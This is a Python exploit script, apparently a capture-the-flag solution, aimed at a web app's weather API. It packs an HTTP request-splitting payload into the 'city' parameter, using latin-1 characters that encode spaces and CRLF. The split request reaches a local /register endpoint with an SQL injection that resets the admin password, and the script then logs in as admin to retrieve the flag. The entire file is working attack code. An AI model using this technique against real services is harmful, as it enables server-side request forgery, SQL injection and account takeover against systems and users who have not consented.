# Coded by d4rkstat1c
import requests
from urllib.parse import quote as urlencode

TARGET = 'http://<IP>:<PORT>'

SQLI_PAYLOAD = "') ON CONFLICT(username) DO UPDATE SET password='x' -- -" 
REQ_SPLIT_TEMPLATE = ''' HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive


POST /register HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
User-Agent: x
Connection: keep-alive
Content-Length: 102

username%3dadmin%26password%3d{enc_sqli_payload}

GET /?'''

# Function to encode string to response splitting compatible latin-1 chars to produce the raw bytes for specific HTTP control chars
def rsplit_encode(req_split):
	"""
	Replaces space and newlines to their corresponding latin-1 chars
	Ġ = space
	Ċ = Carriage return line feed
	"""
	# Just a simple way to replace multiple characters:
	return req_split.translate(str.maketrans({' ': 'Ġ', '\n': 'Ċ'}))

# Generates POST data payload
def gen_payload():
	enc_sqli_payload = urlencode(SQLI_PAYLOAD)
	REQ_SPLIT = REQ_SPLIT_TEMPLATE.format(enc_sqli_payload=enc_sqli_payload)
	payload_dict = {
		'endpoint': '127.0.0.1',
		'city': rsplit_encode(REQ_SPLIT), 
		'country': 'x'
	}
	payload_list = ['{}={}'.format(k,v) for k,v in payload_dict.items()]
	payload_str = '&'.join(payload_list)
	return payload_str.encode()

def exploit():
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	r = requests.post(TARGET + '/api/weather', data=gen_payload(), headers=headers)
	return r.text

def get_flag():
	login_data = {
	'username': 'admin',
	'password': 'x'
	}
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	r = requests.post(TARGET + '/login', data=login_data, headers=headers)
	return r.text

def main():
	print(exploit())
	print('Flag:', get_flag())

if __name__ == '__main__':
	main()
